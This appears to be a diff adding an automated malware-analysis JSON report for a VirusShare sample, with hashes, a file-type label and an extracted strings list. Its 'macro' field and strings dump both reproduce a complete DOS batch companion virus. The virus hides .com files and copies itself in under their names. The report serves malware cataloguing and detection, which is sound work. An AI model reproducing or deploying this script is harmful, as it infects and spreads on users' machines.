@@ -1,0 +1,46 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "COMMAND": "May run PowerShell commands"
+        },
+        "macro": "@ctty nul\nfor %%f in (*.com) do set K=%%f\nif %K%==COMMAND.COM set K=\nrename %K% Y%K%\nif not exist Y%K% goto end\nattrib +h Y%K%\ncopy %0.bat %K%\nattrib +r %K%\nren %K% *.bat\nset K=\n:end\n@if exist Y%0.com Y%0.com %1 %2 %3\n@if exist Y%0.exe Y%0.exe %1 %2 %3\n"
+    },
+    "filename": "VirusShare_43ec013e68383688c9a3e26dd50c76a0",
+    "filesize": 268,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "43ec013e68383688c9a3e26dd50c76a0",
+        "sha1": "13f31737ed39ced2f3d9bf4fd93051bcf7b54956",
+        "sha256": "602c6f84444471f8c5165b3dbf5670d46324a96c31e1651c3a23c663792d9505"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ctty nul",
+            "for %%f in (*.com) do set K=%%f",
+            "if %K%==COMMAND.COM set K=",
+            "rename %K% Y%K%",
+            "if not exist Y%K% goto end",
+            "attrib +h Y%K%",
+            "copy %0.bat %K%",
+            "attrib +r %K%",
+            "ren %K% *.bat",
+            "set K=",
+            ":end",
+            "@if exist Y%0.com Y%0.com %1 %2 %3",
+            "@if exist Y%0.exe Y%0.exe %1 %2 %3"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266436",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
